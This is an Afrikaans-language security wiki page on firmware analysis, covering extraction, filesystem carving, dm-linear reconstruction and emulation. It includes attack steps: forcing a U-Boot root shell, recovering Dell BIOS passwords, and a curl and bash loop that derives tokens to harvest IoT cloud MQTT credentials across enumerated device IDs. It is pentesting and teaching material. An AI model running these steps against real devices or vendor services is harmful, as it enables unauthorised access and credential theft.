# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante bronne

Vir verkryging via blootgestelde hardeware-koppelvlakke, sien [Firmware-dumping met UART-konsolebystand](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) en [SPI-flash-dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Vir ’n herhaalbare UART-opname tydens selflaai, voordat toegang tot die konsole verkry word, sien [SCPI-beheerde kragtoevoer en ossilloskoopverkryging](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle help om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel toegang tot belangrike instruksies het sodra dit aangeskakel word, wat uiteindelik die bedryfstelsel laat begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om ’n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit werk
- Besonderhede oor die bootloader
- Hardeware-uitleg en datablaaie
- Metrieke oor die kodebasis en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsgoed van onskatbare waarde, net soos die ontleding van enige beskikbare open-source sagtewarekomponente deur middel van handmatige en outomatiese hersieningsprosesse. Nutsgoed soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om potensiële probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met sy eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit volgens die verskafde instruksies te **bou**
- Deur dit van amptelike ondersteuningswebwerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om firmwarelêers te vind wat aangebied word
- Deur direk toegang tot **cloud storage** te verkry met nutsgoed soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) of **PICit**
- Deur binne toestelkommunikasie vir opdateringsversoeke te **snuffel**
- Deur **hardcoded opdateringseindpunte** te identifiseer en te gebruik
- Deur vanaf die bootloader of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en uit te lees** wanneer niks anders werk nie, met behulp van toepaslike hardewarenutsgoed

### Slegs UART-logboeke: dwing ’n root shell af via U-Boot-env in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init shell afdwing deur die **U-Boot environment blob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-knip en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot-env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot-env-CRC32 vir die blob weer**.
3. Flits slegs die env-partisie weer en herlaai; ’n shell behoort via UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die selflaaiprogram se shell gedeaktiveer is, maar die env-partisie via eksterne flash-toegang skryfbaar is.

### Bekendmaking van beskermde kode deur ’n Firewall-kopieertaak

Sommige MCU’s laat onbeskermde toepassingskode toe om ’n gateway in ’n beskermde streek aan te roep, eerder as om beskermde Flash direk te lees. Nadat toepassingskode-uitvoering verkry is, ondersoek elke gateway-taak as ’n afsonderlike geheue-oordragprimitief. In die Cypherock X1-geval het die STM32L4 Firewall-oproeppoort ’n taak, ’n eksterne `data`-wyser, ’n lengte en ’n beskermde `address` aanvaar. ’n Skryftaak het versuim om ’n `data`-bronwyser na Firewall Code af te wys. Die oproeper kon nie daardie kode direk lees nie, maar die gateway self kon dit na beskermde nie-vlugtige berging kopieer, waar ’n toegelate leestaak dit blootgelê het.<sup>[[15]](#references)</sup>

Om hierdie soort bekendmaking te reproduseer, identifiseer ’n skryfbare beskermde bergingsbladsy met ’n ooreenstemmende leestaak, stel die skryfbron op opeenvolgende beskermde kodeadresse, en lees die gefaseerde grepe terug. Gaan die bergingsmedium na voordat jy skryfbewerkings herhaal: in hierdie geval was dit Flash, dus moes ’n bladsy uitgevee word voordat dit hergebruik kon word. Die navorsers het ’n roetine gebruik wat die geldige Secure Data Storage-inhoud uitgevee en herstel het, en daarna kode in die oorblywende vrye ruimte gefaseer in plaas daarvan om beursiedata te oorskryf. Dit vereis kode-uitvoering op die MCU en ’n bereikbaar oproeppoort; dit is nie ’n direkte leesomseiling vanaf ’n ongeverifieerde gasheer nie.<sup>[[15]](#references)</sup>

Die herwonne kode kan [vertrouensgapings in firmware-opdaterings en selflaai-integriteit](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) blootlê.<sup>[[15]](#references)</sup>

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende nutsmiddels wat jy daarvoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kyk na die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te ondersoek.

### Rou vertoonbates in eksterne flash

’n Eksterne SPI-dump is nie noodwendig die MCU se uitvoerbare firmware nie. Vergelyk vir ’n Cortex-M-teiken die begin van elke kandidaatkodegebied met die toestel se geheuekaart: ’n normale vektortabel begin met ’n geloofwaardige SRAM-stapelwyser en ’n reset-handler-adres in uitvoerbare geheue. Die afwesigheid van ’n vektortabel by offset nul bewys op sigself nie dat die hele chip geen kode bevat nie; ondersoek ander offsets en die opstartuitleg. As `binwalk` geen houer vind nie, ondersoek die rou grepe en korreleer flash-leesadresse uit ’n [gedekodeerde SPI-opname](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) met aksies wat nuwe skerms laai.<sup>[[14]](#references)</sup>

Probeer vir ’n vertoonbategebied kandidaatpixel-formate en -afmetings eerder as om PNG/JPEG te aanvaar. Die aangehaalde toestel het **80×160 RGB565 little-endian**-rame gebruik: teen twee grepe per pixel is ’n raam **25,600 bytes** (25 KiB), nie 24 kilobits nie. ’n Gedekodeerde flash-leesadres het die offset van die skermbate geïdentifiseer; die navorser het ’n voorbereide image met `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` omgeskakel, die bate met dieselfde grootte in die oorspronklike dump vervang, dit met `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` geskryf en die nuwe image op die skerm bevestig. Dit demonstreer skryfbare *eksterne vertoonbates*, nie die onttrekking of herflashing van die MCU se interne firmware nie. Bewaar die oorspronklike dump en verifieer afmetings, greepvolgorde, offset en vervangingslengte voordat jy enigiets skryf.<sup>[[14]](#references)</sup>

### Differensiële flash-ontleding en herstelbare XOR-geheime stoorplekke

Wanneer ’n firmware-instelling geen gedokumenteerde stoorformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, dump die volledige chip weer en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op ’n slegs-byvoegende of loggestruktureerde stoorplek. Bewaar geskrapte/tombstone-inskrywings, aangesien hul loonvraggreepe moontlik herstelbaar bly.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsgoed soos `binwalk` en reverse-engineer die writer/validator in Ghidra. Bevestig veldgrense, padding, sleutelindeksering en sleutelderivering in die kode, eerder as om die skema net uit patrone in die ciphertext af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nul-padding

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), onthul bekende plaintext keystream-grepe by dieselfde offsets. ’n Veld met ’n vaste grootte is veral blootgestel wanneer die nul-padding daarvan elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde padding onthul daardie sleutelgrepe direk, omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die ciphertext-stert en dekripteer die gevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plaintext, terwyl grepe `1..31` ’n herhalende 20-greep-sleutel gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir 'n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, dus word die volledige sleutel en wagwoord sonder brute force herwin:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Haal sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die toestelsaad en GUID is vas, en die enigste wagwoordafhanklike invoer is die eerste byte in duidelike teks. Dit gee hoogstens 256 sleutels per toestel, en rekords wat met dieselfde byte begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie byte; ’n kort historiese rekord kan die volledige sleutel via padding uitlek en ’n huidige, langer rekord ontsleutel waarvan die eie padding onvoldoende is. Wagwoordrotasie kan dus die blootstelling verhoog wanneer ou ciphertext as tombstone gemerk word eerder as uitgevee.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-hulpmiddel vind DVAR, bekragtig kandidaat-rekords, herwin wagwoorde en kan rou gestoorde/sleutelbytes vertoon. Bou dit vanuit ’n checkout en skandeer ’n geverifieerde flash-beeld soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp vals positiewe resultate met rekordstruktuur, beperkings op drukbare karakters, kontroles vir nulopvulling, sleutelentropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl biswisselings per skryfbewerking toon, lys die waargenome maskers en rangskik regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitvoer as presiese herstel voor te stel.<sup>[[12]](#references)</sup>

Wagwoordverifieerders behoort ’n gesoute, herhaalde eenrigting-hash te stoor eerder as omkeerbare syferteks, en log-gestruktureerde stoorsisteme behoort vervangde geheime materiaal veilig te verwyder.<sup>[[12]](#references)</sup>

### Kry die lêerstelsel

Met die voorheen genoemde nutsgoed, soos `binwalk -ev <bin>`, behoort jy **die lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik na ’n **lêergids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in sulke gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel uit die binêre lêer te carve**, en **onttrek die lêerstelsel handmatig** volgens die tipe daarvan met behulp van die stappe hieronder.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd command** uit om die Squashfs-lêerstelsel uit te kerf.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die gids "`squashfs-root`" wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Herbouing van gesplete ingebedde wortellêerstelsels

As ’n rou eMMC/SSD-dump ’n geldige lêerstelselkopskrif bevat, maar die metadata-afsettings daarvan buite die nominale partisie strek, moet dit nie onmiddellik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike worteltoestel uit verskeie fisiese reekse met Device Mapper saamstel, wat beteken dat die uitsny van een GPT-partisie slegs die eerste segment oplewer.<sup>[[9]](#references)</sup>

#### Triage van die volledige media-beeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skrywer steeds die beeld gebruik nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herwin die GPT in leesalleenmodus en koppel slegs die vereiste reeks; moenie `vgchange -ay` teen ’n onbetroubare fisiese volume op die werkstasie uitvoer nie, want volumegroepbotsings en onbedoelde skryfbewerkings is moontlik.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verkies ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stapel die hele image moet sien. Historiese boot logs van ’n standaardbootpartisie is besonder nuttig: die bootloader het dalk proprietary-container-offsets, komponentlengtes, slotkeuse, belyningsreëls en handtekeningverifikasie aangeteken. Gebruik daardie waardes om ’n ingebedde command line/kernel/initramfs uit te haal, en valideer elke uitvoer afsonderlik met `file`, magiese grepe en `binwalk`; as jy tot aan die einde van die container lees, kan dit per ongeluk ’n initrd, ACPI-objek of handtekening aan die kernel heg.<sup>[[9]](#references)</sup>

#### Herwin die blokkaart tydens boot

Haal die kernel se initramfs uit en reverse-engineer sy `/init` plus enige bergingsbiblioteke. Volg in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partisiepaaie; spoor dan die kode na wat die aktiewe A/B-slot kies en die tabel bou. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die linear target karteer opeenvolgende reekse van ’n virtuele toestel na reekse op een of meer onderliggende toestelle. ’n Herwonne tabel met twee segmente het gewoonlik hierdie vorm (alle posisies en lengtes is 512-grepe-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-aritmetiek presies, insluitend heelgetalwydte, skuiwe en eenheidsomskakelings. Byvoorbeeld, die volgende uitdrukking rond ’n grepe-grootte af tot ’n 4-KiB-grens en skakel dit eers daarna om na 512-grepe-sektore; as jy dit vervang met `p4_bytes // 512`, verskuif die gekose stert met `p4_bytes % 4096` wanneer die partisie nie op ’n bladsygrens belyn is nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Herbou ’n plat analisebeeld deur die reekse in tabelvolgorde met begrensde blokke te kopieer, eerder as om die volledige mediastorting in geheue te laai. Dit vermy ook die skep van mapper-toestelle aan die gasheerkant. Hou die GPT-afgeleide offsets, omgekeerde sektortellings en die resulterende uitvoerlengte as afsonderlike bewerings.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Kontroleer vir SquashFS die `hsqs`-magic en dekodeer die little-endian 64-bis-veld `bytes_used` by superblok-offset 40 voordat jy `unsquashfs` uitvoer. As onttrekking in verskeie onverwante strukture misluk, soek ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadata-blok, verskeie opeenvolgende geldige gidsinskrywings, geloofwaardige inode-velde, ’n wortelinode wat met die inode-telling ooreenstem, of ’n geldige integriteit-metadata-struktuur. ’n Enkele magic-treffer is onvoldoende.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde delta met teken onafhanklike strukture geldig maak—byvoorbeeld gidsmetadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese fout in die segmentbegin, eerder as ontbrekende grepe. Gaan terug na die omgekeerde rekenwerk en kyk na weggegooide reswaardes, tekenhantering, oorloop of sektor-/bladsyafronding voordat jy probeer om weesdata te herstel of lêerstelselmetadata reg te stel.<sup>[[9]](#references)</sup>

Hou laastens die beskermingsgrense apart: TPM-verseëlde LUKS-volumes beskerm datavertroulikheid, terwyl ’n getekende dm-verity-kartering die wortellêerstelsel se integriteit beskerm. ’n Sagteware-TPM kan nie ’n sleutel herwin wat aan die oorspronklike fisiese TPM verseël is nie, en om ’n gewysigde SquashFS met ’n init wat slegs vir navorsing bedoel is en verity-verifikasie weglaat, te begin, vervals nie die handtekening daarvan of breek dm-verity nie.<sup>[[9]](#references)</sup>

## Firmware ontleed

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed sodat jy die struktuur en moontlike kwesbaarhede daarvan verstaan. Hierdie proses behels die gebruik van verskeie nutsgoed om die firmwarebeeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsnutsgoed

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropie** nagegaan met `binwalk -E <bin>`. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word nutsmiddels en bronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan die lêerstelsel gewoonlik onttrek word, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe weens ontbrekende magic bytes herken nie, is handmatige onttrekking nodig. Dit behels die gebruik van `binwalk` om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word aandag gegee aan onveilige netwerkdaemons, hardgekodeerde geloofsbriewe, API-eindpunte, opdateringsbedienerfunksies, ongecompileerde kode, opstartskripte en gecompileerde binaries vir vanlyn ontleding.

**Belangrike liggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel te ontdek:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binaries

Beide bronkode en gecompileerde binaries wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Onttrekking van wolkkonfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie by ’n wolkeindpunt wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy ontdek dat `<token>` plaaslik van die toestel-ID afgelei word met behulp van ’n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY ken in staat om die URL te herskep en die wolkkonfigurasie af te laai, wat dikwels MQTT-geloofsbriewe in gewone teks en onderwerpvoorvoegsels blootlê.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) aan en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud-konfigurasie-URL-patroon en brokeradres afdruk, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Oes wolkkonfigurasie en MQTT-aanmeldbesonderhede

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne geloofsbriewe om op instandhoudingstopics in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumereer voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme sluit verskaffer-OUI-/produk-/tipegrepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's herhaal, tokens aflei en konfigurasies programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Verkry altyd uitdruklike magtiging voordat jy grootskaalse enumerasie probeer.
- Verkies emulasie of statiese analise om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.


Die proses om firmware te emuleer, maak **dinamiese analise** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root-lêerstelsel of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se endianness en SVE-argitektuur te identifiseer.

#### Voorbeeld met MIPS-argitektuur

Om ’n binêre lêer met MIPS-argitektuur te emuleer, kan jy die opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binaries is `qemu-mipsel` die gepaste keuse.

#### Emulasie van ARM-argitektuur

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander maak volledige firmware-emulasie moontlik, outomatiseer die proses en help met dinamiese analise.

### Rekonstruksie van gesplete en geverifieerde root-lêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabelfoostukke onmoontlik lyk, moet jy nie `unsquashfs` dadelik patch nie. Reverse-engineer die vroeë selflaaibinêre lêer en reproduseer die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale root-partisie blootstel, maar die werklike lêerstelsel bou met ’n `dm-linear`-kartering wat sektore wat by ’n ander partisie geleen is, byvoeg. Toetse wat net die superblok nagaan, kan slaag selfs wanneer elke daaropvolgende metadata-blok verskuif is.<sup>[[11]](#references)</sup>

Behou die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; reproduseer verskuiwings en afkapping in hul oorspronklike volgorde; en neem bankafhanklike eindstreke in A/B-uitlegte in ag. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat dan as 512-greep-sektore uit; as jy dit met `partition_bytes // 512` vervang, kan die bygevoegde omvang met ’n paar kilogrepe verskuif en al die daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Haal elke `dm-linear`-segment se brontoestel, beginsektor en lengte uit die verifier/init-binêre lêer.
2. Voeg die omvangsegmente saam of karteer hulle sonder om hul belyningssemantiek te verander.
3. As onttrekking steeds misluk, soek slegs ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadataboue, eerder as om net ’n geloofwaardige superblok te aanvaar.
4. Voer ’n ongemodifiseerde `unsquashfs` op die gerekonstrueerde beeld uit; suksesvolle deurkruising van al die gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Vervanging van dm-verity onder beheer van die ontleder

